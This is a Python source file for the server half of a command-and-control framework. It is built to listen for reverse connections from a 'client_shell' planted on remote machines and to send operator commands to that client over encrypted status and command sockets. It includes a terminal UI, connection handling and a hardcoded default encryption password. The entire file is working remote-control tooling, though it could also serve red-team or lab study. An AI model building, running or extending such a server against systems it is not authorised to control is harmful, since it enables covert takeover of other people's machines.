"""
The c2_Server is the server part of a C2 framework. 
It's designed to communicate with client_shell 
that is to be set up on the remote machine and 
then makes a revese connection to the server.

The module has classes and functionality for: 
managing and displaying server and client-related messages
input/output in a text-based UI using the `urwid` library. 
display statuses.
manage connections read 
handle server and client commands
saving all output to log file for later reference

The classes include:
1. `InputWithHistory`: 
Extends `urwid.Edit` to add a history feature for command input. 
It allows the user to navigate through previously entered commands using the up and down arrow keys.

2. `ServerUI`: 
Provides the main user interface for the server. 
It includes:
    an output window for displaying logs
    a status window for showing the server/client status
    an input prompt for user commands. 
This class runs the UI in a separate thread and handles user input.

3. `OutputManager`: 
Manages the display of output messages and manages the output printing thread. 
It processes messages from the `output_queue` and 
updates the UI, optionally saving messages to a file.

4. `StatusManager`: 
Handles status updates for the server. 
It processes messages from the `status_queue` and 
updates the status window in the UI to reflect server/client status.

5. `ServerConnectionManager`:
Manages the connections between the server and clients.
It handles:
    client status and command connections
    manages the lifecycle of these connections
    provides methods for sending and recieving data to/from connected client

6. `CommandHandler`: 
Processes commands entered by the user in the server UI. 
It reads commands from the `command_queue
processes them accordingly
handles actions like stopping the server or interacting with connected clients.

Key Features:
- Real-time display of server logs, client status, and interactive command input.
- Command input with history support (using arrow keys).
- Background output printing thread to handle UI updates and file saving.
- Server connection management for handling incoming clients and communication.
- Graceful handling of commands and status updates in a multi-threaded environment.

"""
import sys
import os
import socket
import select
import threading
import queue
# import logging
import time
import struct
import argparse
from ast import literal_eval
import urwid

# add parent directory to pythonpath
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from utils.crypto_tool.crypto_tool import encrypt_pwd, decrypt_pwd
from utils.ip_addr_chk.ip_addr_chk import ip_type

# Constant
RETRY_CONNECT = 5

# global variables
shutdown_flag = False
ssm = [
    ["ServerUI","Stopped"],
    ["OutputManager","Stopped"],
    ["StatusManager","Stopped"],
    ["StatusSocket", "Stopped"],
    ["StatusClient", "Offline"],
    ["CommandSocket", "Stopped"],
    ["CommandClient","Offline"],
    ["CommandHandler", "Stopped"],
    ["Bind adress", ""],
    ["Command port", ""],
    ["Status port", ""]
    ]

palette = [
    ("command", "light blue", ''),
    ("response","yellow", '')
    ]

saving_output = False
output_file = ""
crypt_password = "a1B2c3D4e5F6g7H8!"

class InputWithHistory(urwid.Edit):
    """ 
    A class to add a history feature to the urwid.Edit widget.
    Allows the user to navigate through previous commands using the up and down arrow keys.
    """

    def __init__(self, caption: str, *args: tuple, **kwargs: dict) -> None:
        """
        Initializes the InputWithHistory instance.

        :param caption: The caption to display before the input field.
        :param args: Additional positional arguments passed to the urwid.Edit constructor.
        :param kwargs: Additional keyword arguments passed to the urwid.Edit constructor.
        """
        super().__init__(caption, *args, **kwargs)
        # Start history with an empty entry to represent the "last" command
        self.history: list[str] = ['']
        # Track the current position in the history
        self.history_index: int = 0

    def keypress(self, size: tuple[int, int], key: str) -> str | None:
        """
        Handles keypress events to navigate through the command history.

        :param size: The size of the widget.
        :param key: The key pressed by the user.
        :return: None if the key is handled; 
                 otherwise, it returns the result of the superclass keypress.
        """
        # Handle Up Arrow: show previous command from history
        if key == 'up':
            if self.history_index > 0:
                self.history_index -= 1
                self.set_edit_text(self.history[self.history_index])
                self.set_edit_pos(len(self.history[self.history_index]))
            # Don't pass the key to the base class
            return None

        # Handle Down Arrow: go back to the last valid command, or stay at the empty last entry
        elif key == 'down':
            if self.history_index < len(self.history) - 1:
                self.history_index += 1
                self.set_edit_text(self.history[self.history_index])
                self.set_edit_pos(len(self.history[self.history_index]))
            # Don't pass the key to the base class
            return None

        # Pass the key to the base class for other keys (e.g., Enter)
        return super().keypress(size, key)

    def add_to_history(self, command_text: str) -> None:
        """
        Adds a command to the history. New commands are inserted just before the empty last command.
        
        :param command_text: The command text to be added to the history.
        """
        # Insert the new command just before the "empty" last history entry
        # Only add non-empty commands
        if command_text.strip():
            self.history.insert(len(self.history) - 1, command_text)
            # Position on the last valid command
            self.history_index = len(self.history) - 1

class ServerUI:
    """
    A class to manage the server's UI using urwid. Displays an output window for logs,
    a status window for client status updates, and an input box for server commands.
    """

    def __init__(self, output_queue: queue.Queue, command_queue: queue.Queue) -> None:
        """
        Initializes the ServerUI.

        :param output_queue: Queue to receive messages to display in the output window.
        :param command_queue: Queue to receive commands entered by the user.
        """
        # Queue for output log messages
        self.output_queue = output_queue
        # Queue for command messages
        self.command_queue = command_queue

        self.loop = None
        self.ui_thread  = None
        self.stop_flag = False

        # Create initial text widgets for output and status as ListBoxes
        self.output_list = urwid.SimpleListWalker([urwid.Text("")])
        self.output_box = urwid.ListBox(self.output_list)
        self.status_list = urwid.SimpleListWalker([urwid.Text("")])
        self.status_box = urwid.ListBox(self.status_list)

        # Define frames for the output and status windows, side by side in Columns
        self.output_frame = urwid.LineBox(self.output_box, title="Output Window")
        self.status_frame = urwid.LineBox(self.status_box, title="Status Window")
        self.columns = urwid.Columns([
            ("weight", 3, self.output_frame),
            ("weight", 1, self.status_frame)
        ])

        # Define widget and frame for command entry
        self.input_edit = InputWithHistory("> ", align='left')
        self.input_widget = urwid.LineBox(self.input_edit, title="Command Prompt")

        # Stack columns with output/status side-by-side and input at the bottom
        self.main_layout = urwid.Frame(body=self.columns, footer=self.input_widget)

        # Set main layout directly to top widget
        self.top_widget = self.main_layout

    def handle_input(self, input_text: str) -> None:
        """
        Sends entered command text to command queue and displays it in output.

        :param input_text: The command text entered by the user.
        """
        if input_text.strip():
            self.command_queue.put(input_text)
            self.output_queue.put(f"Command: {input_text}")
            self.input_edit.set_edit_text("")

    def handle_enter(self, key: str) -> None:
        """
        Handles Enter key press events to send commands from input field.

        :param key: The key pressed by the user.
        """
        if key == 'enter':
            input_text = self.input_edit.edit_text.strip()
            if input_text:
                self.input_edit.add_to_history(input_text)
                self.handle_input(input_text)

    def start_ui(self) -> None:
        """
        Starts the UI in a separate thread if not already running.
        """
        if not self.ui_thread:  # Start the UI only if it's not already running
            self.output_queue.put("Starting User Interface")
            self.ui_thread = threading.Thread(target=self._run_ui, daemon=True)
            self.ui_thread.start()
            ssm[0][1] = "Running"

    def _run_ui(self) -> None:
        """
        Runs the main UI loop in a thread, displaying the interface and handling input.
        """
        self.loop = urwid.MainLoop(
            self.top_widget,
            unhandled_input=self.handle_enter
        )
        try:
            self.loop.run()
        except Exception as e:
            self.output_queue.put("An error occurred in the Server UI Loop")
            self.output_queue.put(f"Error: {e}")

    def stop_ui(self) -> None:
        """
        Stops the urwid main loop, closing the UI gracefully.
        """
        if self.loop:
            self.loop.stop()
            ssm[0][1] = "Stopped"

class OutputManager:
    """
    Manages output display, handling messages from the output queue
    and adding them to the output window in the UI.
    """

    def __init__(
        self,
        output_queue: queue.Queue,
        output_list: urwid.SimpleListWalker,
        server_ui_loop: urwid.MainLoop
    ) -> None:
        """
        Initializes the OutputManager with queues and output list.

        :param output_queue: Queue to receive output messages.
        :param output_list: Urwid SimpleListWalker to display messages.
        :param server_ui_loop: Urwid main loop instance for UI control.
        """
        self.output_queue = output_queue
        self.output_list = output_list
        self.server_ui_loop = server_ui_loop
        self.output_thread = threading.Thread(target=self.output_printing_thread, daemon=True)
        self.stop_flag = False  # Local flag to control thread termination

    def start(self) -> None:
        """
        Starts the thread that manages the output printing.

        This method initializes the output printing thread and marks the output manager
        as running in the system status.
        
        Returns:
            None
        """
        self.output_queue.put("Starting Output Manager")
        self.output_thread.start()
        ssm[1][1] = "Running"


    def output_printing_thread(self) -> None:
        """
        Continuously processes messages from the output queue and displays them in the UI.

        This method runs in a loop, checking the `stop_flag` and processing messages from
        the `output_queue`. If a message is received, it is appended to the output list and 
        displayed in the UI. If the `saving_output` flag is set, the message is written to
        an output file. The method also ensures the UI is updated by calling `draw_screen()`.

        If the queue is empty, the method continues to check the stop flag without blocking.

        Returns:
            None
        """
        # Check the stop flag
        while not self.stop_flag:
            try:
                # Add a timeout to avoid blocking indefinitely
                message = self.output_queue.get(timeout=1)
                # Append new message to the output list
                self.output_list.append(urwid.Text(message))
                if saving_output:
                    with open(output_file, 'a', encoding='utf-8') as out_file:
                        out_file.write(message + "\n")
                self.output_list.set_focus(len(self.output_list.positions()) - 1)
                self.server_ui_loop.draw_screen()
                self.output_queue.task_done()

            except queue.Empty:
                # If the queue is empty, just continue checking for the stop flag
                continue
            time.sleep(0.1)

    def stop(self) -> None:
        """
        Stops the output printing thread by setting a stop flag and waiting for thread to finish.

        This method sets the stop_flag to True, signaling the thread to terminate, 
        and then waits for the thread to complete by calling `join()` on the output thread.
        Finally, it updates the status management list `ssm` to indicate the "Stopped" state.

        Returns:
            None
        """
        self.stop_flag = True  # Set the flag to True to terminate the thread
        self.output_thread.join()  # Wait for the thread to finish
        ssm[1][1] = "Stopped"

class StatusManager:
    """
    Manages client status messages, adding them to the UI's status window.
    """
    def __init__(
        self,
        output_queue,
        client_status_queue,
        status_queue,
        status_list: urwid.SimpleListWalker,
        server_ui_loop: urwid.MainLoop
    ) -> None:
        """
        Initializes the StatusManager with queues for status messages and display list.

        :param output_queue: Queue to log status updates.
        :param client_status_queue: Queue for status messages received from clients.
        :param status_queue: Queue for status messages to display in the UI.
        :param status_list: Urwid SimpleListWalker for displaying status messages.
        :param server_ui_loop: Urwid main loop instance for UI control.
        """
        self.output_queue = output_queue
        self.client_status_queue = client_status_queue
        self.status_queue = status_queue
        self.status_list = status_list
        self.server_ui_loop = server_ui_loop
        self.status_thread = threading.Thread(target=self.status_printing_thread, daemon=True)
        self.csm_list = [""]  # List of client status messages
        self.stop_signal = False  # Stop signal for the thread

    def parse_client_status(self) -> None:
        """ 
        Parses client status information from the client_status_queue and populates
        the csm_list with formatted strings for display.

        The method checks the queue for status information and handles it in two ways:
        - If the status is a simple string, it is appended directly.
        - If the status is a dictionary (in string format), it is parsed and formatted 
          into individual function status messages.

        Returns:
            None
        """
        self.csm_list.clear()

        if not self.client_status_queue.empty():
            csm = self.client_status_queue.get(timeout=1)
            self.client_status_queue.task_done()
        else:
            csm = " "

        # If not starting with "{", it's just a plain string.
        if not csm[0] == "{":
            self.csm_list.append(csm)
        # If starting with "{", it's a dictionary (in string format)
        else:
            # Convert to dictionary
            csm_dict = literal_eval(csm)
            # Loop through dictionary to populate a list of strings
            for function, details in csm_dict['functions'].items():
                self.csm_list.append(f"{function} - {details['status']}")

        # Add a separator line
        self.csm_list.append("_" * 35)

    def create_status_message(self) -> str:
        """ 
        Combines the client status messages and server status messages 
        into a single formatted string.

        Returns:
            str: The formatted status message including both client and server status.
        """
        status_message_str = "Client Status\n" + "_" * 35 + "\n"
        self.parse_client_status()

        # Add client status messages
        for csm in self.csm_list:
            status_message_str += csm + "\n"

        # Add server status messages
        status_message_str += "Server Status\n" + "_" * 35 + "\n"
        for service, status in ssm:
            status_message_str += f"{service.ljust(20)}: {status}\n"

        return status_message_str

    def start(self) -> None:
        """
        Starts the thread that processes status messages and updates the UI.
        Initializes the status printing thread and sets its state to 'Running'.
        """
        self.output_queue.put("Starting Status Manager")
        self.status_thread.start()
        ssm[2][1] = "Running"

    def status_printing_thread(self) -> None:
        """
        Continuously processes status messages from the status_queue for UI display.
        Updates the UI with the latest status messages, refreshing every second.
        """
        while not self.stop_signal:  # Check for the stop signal
            try:
                status_message = self.create_status_message()
                self.status_list.clear()
                self.status_list.append(urwid.Text(status_message))
                self.server_ui_loop.draw_screen()
                time.sleep(1)
            except queue.Empty:
                continue  # If the queue is empty, just continue checking for the stop signal
        ssm[2][1] = "Stopped"

    def stop(self) -> None:
        """
        Signals the status thread to stop processing messages.
        """
        self.stop_signal = True

class ServerConnectionManager:
    """
    Manages server connections, handling client communication over status and command sockets.
    """

    def __init__(
        self,
        output_queue: queue.Queue,
        client_status_queue: queue.Queue,
        send_to_client_queue: queue.Queue,
        host: str,
        status_port: int,
        command_port: int
    ) -> None:
        """
        Initializes the connection manager with socket configurations.

        :param output_queue: Queue for logging connection events.
        :param client_status_queue: Queue for status messages from clients.
        :param send_to_client_queue: Queue to send commands to the client.
        :param host: Host IP for server sockets.
        :param status_port: Port for the status socket.
        :param command_port: Port for the command socket.
        """
        self.output_queue = output_queue
        self.client_status_queue = client_status_queue
        self.send_to_client_queue = send_to_client_queue
        self.host = host

        self.status_port = status_port
        self.status_socket = None
        self.status_conn = None
        self.status_thread = None
        self.stop_status_socket = False
        self.status_reconnect = True

        self.command_port = command_port
        self.command_socket = None
        self.command_conn = None
        self.command_thread = None
        self.stop_command_socket = False
        self.command_reconnect = True
    def start_status_socket(self) -> None:
        """
        Starts and monitors the status socket for client connections.

        This method initializes the status socket, binds it to a specified host and port,
        and listens for incoming client connections. Once a client connects, it handles
        receiving encrypted status updates and places them into the client status queue.

        The method continues to monitor the socket until the stop condition is met, allowing
        reconnection attempts in case of socket errors.

        The status updates are decrypted before being added to the queue for further processing.
        """
        def status_socket_thread() -> None:
            """ 
            Thread for starting and listening to the status socket.
            """
            while self.status_reconnect:
                self.output_queue.put("Starting Status socket")
                self.status_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.status_socket.bind((self.host, self.status_port))
                self.status_socket.listen(1)
                ssm[3][1] = "Running"

                try:
                    self.status_conn, _ = self.status_socket.accept()
                    ssm[4][1] = "Online"
                    with self.status_conn:
                        while not self.stop_status_socket:
                            ciph_status_update = self.status_conn.recv(1024)
                            status_update = decrypt_pwd(ciph_status_update, crypt_password).decode()
                            if not status_update:
                                break
                            self.client_status_queue.put(status_update)
                            time.sleep(0.5)
                except socket.error as e:
                    self.output_queue.put(f"Status socket error: {e}")
                    ssm[3][1] = "Stopped"
                    ssm[4][1] = "Offline"
                    if not self.stop_status_socket:
                        self.output_queue.put("Status channel Offline. Listening for connection")
                        self.status_reconnect = True
                        time.sleep(RETRY_CONNECT)
                finally:
                    time.sleep(0.5)

                if self.stop_status_socket:
                    self.status_reconnect = False
            # status_socket_thread stops here

        # Start the thread
        self.status_thread = threading.Thread(target=status_socket_thread, daemon=True)
        self.status_thread.start()

    def start_command_socket(self) -> None:
        """
        Starts and monitors the command socket for handling client commands.

        This method initializes the command socket, binds it to a specified host and port,
        and listens for incoming client connections. Once a client connects, it handles
        sending and receiving encrypted data over the socket using a separate thread.

        It will continue to monitor the socket until the stop condition is met, allowing
        reconnection attempts in case of connection loss.

        The method uses non-blocking sockets, select for I/O multiplexing, and encrypted
        communication for secure message transmission.
        """
        def command_socket_thread() -> None:
            """ 
            Thread for starting and listening to the command socket.
            """
            self.output_queue.put("Starting Command socket")
            while not self.stop_command_socket:  # Check stop condition at the start of the loop
                try:
                    if self.command_reconnect:
                        self.command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        self.command_socket.bind((self.host, self.command_port))
                        self.command_socket.settimeout(2)
                        self.command_socket.listen(1)
                        self.command_reconnect = False
                        ssm[5][1] = "Running"

                    # Attempt a connection.
                    self.command_conn, _ = self.command_socket.accept()
                    peer_name = self.command_conn.getpeername()
                    self.output_queue.put(f"Client connected from {peer_name}")
                    ssm[6][1] = "Online"
                    # Making socket non-blocking
                    self.command_conn.setblocking(False)
                    self.command_reconnect = False
                    inputs = [self.command_conn]
                    outputs = [self.command_conn]

                    # Continue until disconnected, not reconnect or stop command is set
                    while inputs and not self.stop_command_socket and not self.command_reconnect:
                        readable, writable, exceptional = select.select(inputs, outputs, inputs, 1)

                        # Loop to send data from the queue
                        for sock in writable:
                            if not self.send_to_client_queue.empty():
                                send_data = self.send_to_client_queue.get(timeout=1)
                                ciph_data = encrypt_pwd(send_data.encode('utf-8'), crypt_password)
                                sock.sendall(ciph_data)
                                time.sleep(0.1)

                        # Loop to receive data from the socket
                        for sock in readable:
                            try:
                                length_bytes = sock.recv(4)
                                if not length_bytes:
                                    raise ConnectionResetError("Connection lost, no data received.")

                                length = struct.unpack('!I', length_bytes)[0]
                                message_bytes = sock.recv(length)
                                # Attempt decryption
                                response = decrypt_pwd(message_bytes, crypt_password).decode()
                                self.output_queue.put(f"> {response}")

                            except ConnectionResetError:
                                self.output_queue.put("Connection lost, waiting for reconnection.")
                                ssm[5][1] = "Stopped"
                                ssm[6][1] = "Offline"
                                self.command_reconnect = True
                                time.sleep(RETRY_CONNECT)
                                break  # Exit to attempt reconnection logic
                            except Exception:
                                self.output_queue.put(f"Error while processing message: {e}")
                                self.command_reconnect = True

                        # Handle exceptional sockets
                        for sock in exceptional:
                            inputs.remove(sock)
                            if sock in outputs:
                                outputs.remove(sock)
                            self.command_reconnect = True
                        time.sleep(0.1)

                except socket.timeout:
                    continue  # Timeout means no client is trying to connect

                except socket.error as e:
                    if not self.stop_command_socket:  # Only log if not stopping
                        self.output_queue.put(f"Command socket error: {e}")
                        ssm[5][1] = "Stopped"
                        ssm[6][1] = "Offline"
                        self.output_queue.put("Lost connection on command channel. Reconnecting")
                        self.command_reconnect = True
                        time.sleep(RETRY_CONNECT)
                        # Attempt reconnection logic would be handled after breaking the inner loop

                finally:
                    time.sleep(0.1)  # Sleep before retrying

        # Start the thread
        self.command_thread = threading.Thread(target=command_socket_thread, daemon=True)
        self.command_thread.start()

    def stop_all(self) -> None:
        """
        Signals threads to stop and closes active sockets.

        This method sets flags to stop both the status and command sockets,
        then waits for the sockets to close before exiting the threads. It ensures
        that connections and resources are properly closed before the application exits.

        The method also updates the status of the sockets and logs actions to 
        the output queue.
        """
        self.stop_status_socket = True
        self.stop_command_socket = True
        # Wait for socket code to react to stop flags and finish
        time.sleep(3)

        # Close socket before exiting thread
        if self.status_socket:
            if self.status_conn:
                self.status_conn.close()
                ssm[4][1] = "Offline"
            self.output_queue.put("Stopping status socket")
            self.status_socket.close()
            ssm[3][1] = "Stopped"

        if self.command_socket:
            if self.command_conn:
                self.command_conn.close()
                ssm[6][1] = "Offline"
            self.output_queue.put("Stopping command socket")
            self.command_socket.close()
            ssm[5][1] = "Stopped"

class CommandHandler:
    """
    Handles commands entered by the user and directs them to the server or client.

    This class processes commands from the command queue and executes corresponding 
    actions for either the server or client. It manages communication between the 
    server and client through queues.
    """
    def __init__(
        self,
        output_queue: queue.Queue,
        command_queue: queue.Queue,
        send_to_client_queue: queue.Queue) -> None:
        """
        Initializes CommandHandler with queues for server and client commands.

        :param output_queue: Queue for logging command responses.
        :param command_queue: Queue for received commands.
        :param send_to_client_queue: Queue to send commands to the client.
        """
        self.output_queue = output_queue
        self.command_queue = command_queue
        self.send_to_client_queue = send_to_client_queue  # Added queue for client commands
        self.command_thread = threading.Thread(target=self.command_handling_thread, daemon=True)
        self.server_commands = [
            ("command", "[parameters]", "description"),
            ("help", "[command]",
                "outputs list of available server commands or syntax and description of [command]"),
            ("save_output", "file_name", "continously log output to file"),
            ("exit", "", "shuts down the server in an orderly fashion")
        ]


    def start(self) -> None:
        """
        Starts the thread that handles incoming commands.

        This method initializes the command handler thread and sets the 
        status of the command handler to "Running".
        """
        self.output_queue.put("Starting Command Handler")
        self.command_thread.start()
        ssm[7][1] = "Running"

    def command_handling_thread(self) -> None:
        """
        Continuously processes commands from the command queue, directing them to 
        appropriate server or client handlers.

        This function checks the `shutdown_flag` to terminate the loop when a shutdown is requested.
        """
        while not shutdown_flag:  # Check the shutdown flag
            try:
                # Add a timeout to avoid blocking indefinitely
                command = self.command_queue.get(timeout=1)

                # Process command here
                command_parts = command.split(maxsplit=1)
                if len(command_parts) < 2:
                    self.output_queue.put("Syntax Error: [(s)erver|(c)lient] [command]")
                    continue

                destination = command_parts[0]  # server or client
                actual_command = command_parts[1]  # The actual command to execute

                if destination in ("server", "s"):
                    self.handle_server_command(actual_command)
                elif destination in ("client", "c"):
                    self.handle_client_command(actual_command)
                else:
                    self.output_queue.put("Syntax Error: [(s)erver|(c)lient] [command] [arguments]")

                self.command_queue.task_done()
            except queue.Empty:
                continue  # If the queue is empty, just continue checking for the shutdown flag

        ssm[7][1] = "Stopped"


    def handle_server_command(self, command: str) -> None:
        """
        Processes commands intended for server control.

        Args:
            command (str): Command directed to the server.
        """
        global shutdown_flag

        if command == "exit":
            # Tell the system to shut down orderly
            shutdown_flag = True

        elif command == "help":
            # If only help - add the list of server commands to output queue
            if len(command.split(maxsplit=2)) == 1:
                self.output_queue.put("Available server commands. (s)erver [command]")
                for help_strs in self.server_commands:
                    if help_strs[0] != "command":
                        self.output_queue.put(help_strs[0])

        elif len(command.split(maxsplit=2)) == 2 and command.split(maxsplit=2)[0] == "help":
            # If help [command] - add syntax and a description to output_queue
            command_found = False
            help_command = command.split(maxsplit=2)[1]
            for com_str, param_str, desc_str in self.server_commands:
                if com_str == help_command and com_str != "command":
                    command_found = True
                    self.output_queue.put(f"{com_str} {param_str}  - {desc_str}")
                    break
            if not command_found:
                self.output_queue.put("Enter '(s)erver help' for list of all available commands")

        elif command.startswith("save_output"):
            commands = command.split(maxsplit=2)
            if len(commands) == 2:
                global saving_output
                global output_file
                saving_output = True
                output_file = commands[1]
            else:
                self.output_queue.put(f"{commands[0]} need a filename as argument.")


    def handle_client_command(self, command: str) -> None:
        """
        Directs client-specific commands to the `send_to_client_queue`.

        Args:
            command (str): Command intended for the client.
        """
        # Here, we add the command to the send_to_client queue for processing.
        self.send_to_client_queue.put(command)  # Send the client command to the queue

def parse_arguments() -> argparse.Namespace:
    """
    Parse command-line arguments for configuring the client connection.

    Returns:
        argparse.Namespace: An object containing the parsed arguments:
            - bind (str): The server IP address. Default is '127.0.0.1'.
            - s_port (int): The port for status updates. Default is 8001.
            - c_port (int): The port for sending commands. Default is 8000.
            - pw (str): The password for generating the encryption key,
                        must match the server's password.
    """
    parser = argparse.ArgumentParser(description="Client for connecting to the server.")

    parser.add_argument(
        '--bind',
        type=ip_type,
        default='127.0.0.1',
        help='The server IP address. Default is 127.0.0.1.'
    )
    parser.add_argument(
        '--s_port',
        type=int,
        default=8001,
        help='The port for status updates. Default is 8001.'
    )
    parser.add_argument(
        '--c_port',
        type=int,
        default=8000,
        help='The port for sending commands. Default is 8000.'
    )
    parser.add_argument(
        '--pw',
        type=str,
        default="a1B2c3D4e5F6g7H8!",
        help='The password used for generating the encryption key. Must match the server.'
    )

    args = parser.parse_args()
    return args

def main() -> None:
    """
    Initialize and start the server's main components, 
    including UI, managers, and connection handling.

    This function sets up and runs:
        server's UI
        output manager
        status manager
        server connection manager
        command handler. 
    Each component is started, and the function then manages a sequential shutdown process, 
    ensuring each component stops gracefully before exiting.

    Global Variables:
        crypt_password (str): Password used for generating the encryption key, 
                              set from parsed arguments.

    Returns:
        None
    """
    args = parse_arguments()
    global crypt_password
    crypt_password = args.pw
    ssm[8][1] = args.bind
    ssm[9][1] = args.c_port
    ssm[10][1] = args.s_port

    # Debug logging
    # Remove comments to enable logging to file.
    # Insert last line with proper text to log what happens
    # logging.basicConfig(
    # filename='debug.log',  # Log file name
    # level=logging.INFO,    # Set the logging level to DEBUG
    # format='%(asctime)s - %(levelname)s - %(message)s',  # Log message format
    # )
    # logging.info(f"Logging started")
    # logging.info(f"text i want to log {value_i_want_to_log}")

    # Initialize output, status, and command queues
    output_queue = queue.Queue()
    status_queue = queue.Queue()
    command_queue = queue.Queue()
    send_to_client_queue = queue.Queue()
    client_status_queue = queue.Queue()

    # Initialize and start the server UI
    server_ui = ServerUI(output_queue, command_queue)
    server_ui.start_ui()

    # Initialize and start the output manager
    time.sleep(3)
    output_mgr = OutputManager(output_queue, server_ui.output_list, server_ui.loop)
    output_mgr.start()

    # Initialize and start the status manager
    status_mgr = StatusManager(
        output_queue,
        client_status_queue,
        status_queue,
        server_ui.status_list,
        server_ui.loop
    )
    status_mgr.start()

    # Initialize and start the server connection manager
    server_mgr = ServerConnectionManager(
        output_queue=output_queue,
        client_status_queue=client_status_queue,
        send_to_client_queue=send_to_client_queue,
        host=args.bind,
        status_port=args.s_port,
        command_port=args.c_port
    )
    server_mgr.start_status_socket()
    server_mgr.start_command_socket()

    # Initialize and start the command handler
    command_handler = CommandHandler(output_queue, command_queue, send_to_client_queue)
    command_handler.start()

    # Shutdown sequence
    # From here on the shutdown sequence starts, ending thread for thread
    command_handler.command_thread.join()  # Wait for command handler to finish
    output_queue.put("Command Handler is stopped")
    time.sleep(1)

    # Stop the server manager and wait for its threads to finish
    server_mgr.stop_all()

    # Ensure the status thread finishes
    server_mgr.status_thread.join()
    output_queue.put("Status Connection Handler is stopped")
    time.sleep(1)

    # Ensure the command thread finishes
    server_mgr.command_thread.join()
    output_queue.put("Command Connection Handler is stopped")
    time.sleep(1)

    # Signal the status manager to exit and wait for it to finish
    status_mgr.stop()
    status_mgr.status_thread.join()
    output_queue.put("Status Window is stopped")
    time.sleep(1)

    # Signal the output manager to exit and wait for it to finish
    output_mgr.stop()
    output_mgr.output_thread.join()

    # Stop ServerUI last, before exiting
    server_ui.stop_ui()

    print("Server shutdown complete")  # Final message
    sys.exit(0)

if __name__ == "__main__":
    main()
